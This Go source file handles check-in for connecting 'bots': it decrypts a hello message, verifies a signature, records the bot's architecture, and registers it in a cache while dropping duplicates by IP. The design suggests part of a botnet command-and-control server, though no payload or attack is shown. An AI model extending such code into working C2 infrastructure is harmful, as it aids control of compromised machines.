package bot

import (
	"bytes"
	"fmt"
	"servers/domain"
	"strings"
	"time"
)

func (h *Handler) botHello() {

	h.bot.Conn.SetDeadline(time.Now().Add(5 * time.Second))

	var b = make([]byte, 1024)

	n, err := h.bot.Conn.Read(b)
	if err != nil {
		fmt.Printf("[BOT] %s Error: %v ", h.bot.Ip, err)
		return
	}

	parts := bytes.Split(b[:n], []byte("|"))
	if len(parts) < 1 {
		fmt.Println("[BOT] Error: Invalid hello msg")
		return
	}

	key := int(parts[len(parts)-1][0])
	fmt.Println("[BOT] Key:", key)

	d := h.services.Encrypter.Decrypt(string(b[:n]), key)

	msgDecrypted := strings.Split(d, "|")
	if len(msgDecrypted) != 2 {
		fmt.Println("[BOT] Error: Invalid decrypted msg")
		return
	}

	if msgDecrypted[0] != HELLO_SIGNATURE {
		fmt.Println("[BOT] Error: Invalid sign")
		return
	}

	h.bot.Arch = msgDecrypted[1]

	fmt.Println("ARCH", msgDecrypted[1])

	// disconnect bot if already connected
	h.services.BotCache.Range(func(_, value any) bool {
		v, err := domain.SafeCast[domain.Bot](value)
		if err != nil {
			panic(err)
		}

		if v.Ip == h.bot.Ip {
			h.Disconnect()
			return false
		}
		return true
	})

	h.bot.Conn.SetDeadline(time.Time{})

	h.services.BotCache.Set(h.bot.Addr, h.bot)
}

func (h *Handler) print() {
	h.services.BotCache.Range(func(key, value any) bool {
		fmt.Println(key, value)
		return true
	})
}
